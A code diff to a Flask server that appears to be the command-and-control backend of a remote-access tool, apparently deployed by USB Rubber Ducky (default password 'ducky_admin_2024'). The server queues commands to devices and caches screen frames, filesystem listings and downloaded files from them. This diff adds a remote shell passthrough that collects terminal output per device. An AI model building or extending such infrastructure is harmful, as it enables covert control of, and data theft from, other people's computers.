@@ -9,8 +9,6 @@ from datetime import datetime, timedelta, timezone
 app = Flask(__name__)
 
 # --- STRICT CORS CONFIGURATION ---
-# This explicitly allows the dashboard to communicate with Render, 
-# explicitly permitting our custom password header.
 CORS(app, resources={
     r"/*": {
         "origins": "*",
@@ -19,12 +17,10 @@ CORS(app, resources={
     }
 })
 
-# Catch backend crashes and return them as JSON so the dashboard can read them.
 @app.errorhandler(Exception)
 def handle_exception(e):
     return jsonify({"error": f"Backend Error: {str(e)}"}), 500
 
-# Credentials from Render Environment Variables
 SUPABASE_URL = os.environ.get("SUPABASE_URL")
 SUPABASE_KEY = os.environ.get("SUPABASE_KEY")
 DASHBOARD_PASSWORD = os.environ.get("DASHBOARD_PASSWORD", "ducky_admin_2024")
@@ -34,6 +30,7 @@ command_queue = {}
 frame_cache = {}
 filesystem_cache = {}
 file_download_cache = {} 
+terminal_cache = {} # NEW: Cache for real terminal passthrough
 
 # ---------------------------------------------------------
 # HELPER FUNCTIONS
@@ -145,6 +142,13 @@ def get_fs_download(device_id):
     try: return jsonify(json.loads(json_data)), 200
     except Exception: return jsonify({"error": "Invalid format"}), 500
 
+# NEW: Terminal Endpoint
+@app.route('/shell/<device_id>', methods=['GET'])
+def get_shell_output(device_id):
+    if request.headers.get("X-Dashboard-Password") != DASHBOARD_PASSWORD: return jsonify({"error": "Unauthorized"}), 401
+    outputs = terminal_cache.pop(device_id, [])
+    return jsonify({"outputs": outputs}), 200
+
 # ---------------------------------------------------------
 # PAYLOAD ENDPOINTS
 # ---------------------------------------------------------
@@ -160,13 +164,24 @@ def push_frame():
 @app.route('/logs', methods=['POST'])
 def push_logs():
     data = request.json
+    
+    # Intercept caching endpoints so they don't bloat the SQL database
     if data and data.get("category") == "filesystem_data":
         filesystem_cache[data.get("device_id")] = data.get("content")
         return jsonify({"status": "fs data cached"}), 200
     if data and data.get("category") == "file_download_data":
         file_download_cache[data.get("device_id")] = data.get("content")
         return jsonify({"status": "download cached"}), 200
+    
+    # NEW: Intercept real terminal output
+    if data and data.get("category") == "shell_output":
+        dev_id = data.get("device_id")
+        if dev_id not in terminal_cache:
+            terminal_cache[dev_id] = []
+        terminal_cache[dev_id].append(data.get("content"))
+        return jsonify({"status": "shell cached"}), 200
 
+    # Normal Database Storage
     headers = {"apikey": SUPABASE_KEY, "Authorization": f"Bearer {SUPABASE_KEY}", "Prefer": "return=minimal,resolution=merge-duplicates"}
     upsert_url = f"{SUPABASE_URL}?on_conflict=device_id,category"
     try:
